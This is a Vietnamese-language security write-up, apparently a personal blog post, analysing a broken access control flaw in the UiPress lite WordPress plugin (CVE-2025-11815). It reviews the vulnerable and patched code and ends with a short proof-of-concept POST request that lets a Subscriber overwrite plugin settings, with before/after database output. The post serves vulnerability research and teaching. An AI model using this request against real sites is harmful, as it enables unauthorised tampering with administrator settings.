# CVE-2025-11815 Analysis & POC


<!--more-->

## CVE & Basic Info
**UiPress lite** | **plugin** tạo **custom dashboards**, **admin themes** và **pages** cho **WordPress** dễ dàng bị **tấn công** dẫn đến **sửa đổi dữ liệu trái phép** do thiếu **kiểm tra capability** trong **hàm uip_save_site_option()** ở tất cả các phiên bản cho đến và bao gồm **3.5.08**. Điều này cho phép **kẻ tấn công đã xác thực**, với quyền **Subscriber-level** trở lên, thay đổi tùy ý **cài đặt plugin**. Các **hành động AJAX** khác cũng bị ảnh hưởng.

* **CVE ID**: [CVE-2025-11815](https://www.cve.org/CVERecord?id=CVE-2025-11815)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 3.5.08
* **Patched Versions**: 3.5.09
* **CVSS severity**: Low (5.4)
* **Required Privilege**: Subcriber
* **Product**: [WordPress UiPress lite Plugin](https://wordpress.org/plugins/uipress-lite/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **UiPress lite**:  
    * `3.5.08` – **vulnerable**  
    * `3.5.09` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đăng ký một danh sách dài các AJAX:

```php {title="ajax-functions.php" hl_lines=[25] data-open=true}
public function load_ajax()
{
    $function_names = [
      "uip_get_users_and_roles",
      "uip_get_post_types",
      "uip_get_recent_posts",
      "uip_get_posts_for_table",
      "uip_get_post_table_columns",
      "uip_delete_post",
      "uip_save_user_preference",
      "uip_get_user_preference",
      "uip_search_content",
      "uip_process_form_input",
      "uip_send_form_email",
      "uip_save_form_as_option",
      "uip_save_form_as_user_option",
      "uip_pre_populate_form_data",
      "uip_create_frame_switch",
      "uip_get_sync_options",
      "uip_refresh_sync_key",
      "uip_save_sync_options",
      "uip_start_site_sync",
      "uip_check_for_template_updates",
      "uip_process_block_query",
      "uip_save_site_option",
      "uip_send_message_to_gpt",
      "uip_global_export",
      "uip_global_import",
      "uip_push_new_custom_menu_items",
      "uip_remove_custom_menu_items",
    ];

    foreach ($function_names as $name) {
      add_action("wp_ajax_{$name}", [$this, $name]);
    }
}
```

Tiền tố `wp_ajax_` cho biết các AJAX này chỉ chạy với người dùng đã đăng nhập.

Ở bản lỗi **v3.5.08**, toàn bộ callback đều không kiểm tra quyền người dùng. Ví dụ:

```php {title="ajax-functions.php v3.5.08" hl_lines=[3] data-open=true}
public function uip_save_site_option()
{
    Ajax::check_referer();

    $option = json_decode(stripslashes($_POST["option"]));
    $option = Sanitize::clean_input_with_code($option);
    $optionName = sanitize_text_field($_POST["optionName"]);

    if (!$optionName) {
      Ajax::error(__("No option name specified", "uipress-lite"));
    }

    UipOptions::update($optionName, $option);

    $returndata["success"] = true;
    $returndata["message"] = __("Option saved", "uipress-lite");
    wp_send_json($returndata);
}
```

Hàm này thực hiện update option `uip-global-settings` trong database với các giá trị `option` và `optionName` được lấy từ POST request.

```php {title="UipOptions.php v3.5.08" hl_lines=[12] data-open=true}
public static function update($key = null, $newValue = false)
{
    $options = get_option("uip-global-settings");
    $options = $options ? $options : [];

    if (isset($key)) {
        $options[$key] = $newValue;
    } else {
        $options = $newValue;
    }

    update_option("uip-global-settings", $options);
}
```

Option này được lưu trong bảng `wp_options` với `option_name` là `uip-global-settings`

```sh {data-open=true}
mysql> select * from wp_options where option_name='uip-global-settings';
+-----------+---------------------+------------------------------------------------------------------------------+----------+
| option_id | option_name         | option_value                                                                 | autoload |
+-----------+---------------------+------------------------------------------------------------------------------+----------+
|       363 | uip-global-settings | a:1:{s:11:"remote-sync";a:1:{s:3:"key";s:27:"uip-692c7c8dd99844.95568294";}} | auto     |
+-----------+---------------------+------------------------------------------------------------------------------+----------+
1 row in set (0.00 sec)
```

Mặc dù `Ajax::check_referer()` kiểm tra CSRF bằng `security` nonce:

```php {title="Ajax.php v3.5.08" hl_lines=[25] data-open=true}
public static function check_referer()
{
    $doingAjax = defined("DOING_AJAX") && DOING_AJAX;
    $referer = check_ajax_referer("uip-security-nonce", "security") > 0;
    $result = $doingAjax && $referer;

    if (!$result) {
        self::error(__("Unable to perform action", "uipress-lite"));
    }
}
```

Nonce này xuất hiện trong Dashboard của mọi người dùng đã đăng nhập, kể cả Subscriber. Tuy nhiên các hành động AJAX thực tế chỉ dành cho admin.

![Nonce](nonce.png "Nonce trong admin Dashboard")

Ở bản vá **v3.5.09**, nhà phát triển đã bổ sung kiểm tra quyền:

```php {data-open=true title="v3.5.09"}
public static function check_referer()
{
    Ajax::check_referer();

    if (!current_user_can("manage_options")) {
      Ajax::error(__("You do not have permission to perform this action", "uipress-lite"));
    }
    ...
}
```

`manage_options` là quyền thuộc về admin, nên chỉ admin mới có thể thực thi các AJAX này.

Toàn bộ các callback AJAX đăng ký ở trên đều được áp dụng cùng cơ chế kiểm tra trong bản vá.

## Flow
{{< mermaid >}}
graph TD

A["Authenticated user (Subscriber or higher)"] 
--> B["Dashboard renders → 'uip-security-nonce' is available to all logged-in users"]
--> C["Attacker sends AJAX request: action=uip_save_site_option"]
--> D["Hook triggered: wp_ajax_uip_save_site_option"]
--> E["Ajax::check_referer() validates nonce — passes"]
--> F["No capability check is performed"]
--> G["uip_save_site_option() executes"]
--> H["Reads POST parameters: optionName + option"]
--> I["Calls UipOptions::update()"]
--> J["update_option('uip-global-settings', attacker-controlled data)"]
--> K["Plugin settings overwritten by a low-privileged user"]

{{< /mermaid >}}

## Proof of Concept (PoC)
1. Login bằng Subcriber account
2. Lấy nonce từ admin Dashboard
3. Gửi request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: subcriber+_cookie

action=uip_save_site_option&security=e032057458&option={payload}&optionName=remote-sync
```

```sh {data-open=true}
--- Before
mysql> select * from wp_options where option_name='uip-global-settings';
+-----------+---------------------+------------------------------------------------------------------------------+----------+
| option_id | option_name         | option_value                                                                 | autoload |
+-----------+---------------------+------------------------------------------------------------------------------+----------+
|       363 | uip-global-settings | a:1:{s:11:"remote-sync";a:1:{s:3:"key";s:27:"uip-692c7c8dd99844.95568294";}} | auto     |
+-----------+---------------------+------------------------------------------------------------------------------+----------+
1 row in set (0.00 sec)

-- After 
mysql> select * from wp_options where option_name='uip-global-settings';
+-----------+---------------------+----------------------------------------------+----------+
| option_id | option_name         | option_value                                 | autoload |
+-----------+---------------------+----------------------------------------------+----------+
|       363 | uip-global-settings | a:1:{s:11:"remote-sync";O:8:"stdClass":0:{}} | auto     |
+-----------+---------------------+----------------------------------------------+----------+
1 row in set (0.00 sec)
```

**Error xảy ra**:

![Error](err.png "Error xảy ra khi option thay đổi")

## Conclusion

Lỗ hổng trong UiPress lite <= 3.5.08 xuất phát từ việc thiếu kiểm tra quyền trong các AJAX callback dành cho người dùng đã đăng nhập, đặc biệt là hàm `uip_save_site_option()`. Mặc dù plugin có kiểm tra CSRF bằng nonce, nonce này lại được cung cấp cho mọi người dùng, bao gồm cả Subscriber. Điều này cho phép bất kỳ tài khoản có quyền thấp nào cũng có thể gọi trực tiếp các hành động AJAX đặc quyền và ghi đè các thiết lập quan trọng của plugin trong `uip-global-settings`. Đây là một lỗi Broken Access Control cho phép người dùng quyền thấp sửa đổi dữ liệu chỉ dành cho admin. Bản vá 3.5.09 khắc phục bằng cách thêm kiểm tra `current_user_can('manage_options')`.

## Key Takeaways

* **CSRF nonce không đủ an toàn** nếu thiếu kiểm tra quyền cho hành động được thực thi.
* **Mọi AJAX đặc quyền phải kiểm tra capability** trước khi xử lý dữ liệu.
* **Nonce hiển thị cho mọi user** có thể dẫn đến lạm dụng khi kết hợp với thiếu kiểm tra quyền.
* **Tài khoản quyền thấp không bao giờ được phép chỉnh sửa thiết lập admin**, dù qua AJAX hay bất kỳ cơ chế nào khác.
* **Nonce + capability check luôn phải đi kèm nhau** để tránh CSRF và lỗi leo thang đặc quyền.

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress UiPress lite Plugin <= 3.5.08 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-08-missing-authorization-to-authenticated-subscriber-plugin-settings-update-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-10-cve-2025-11815/  

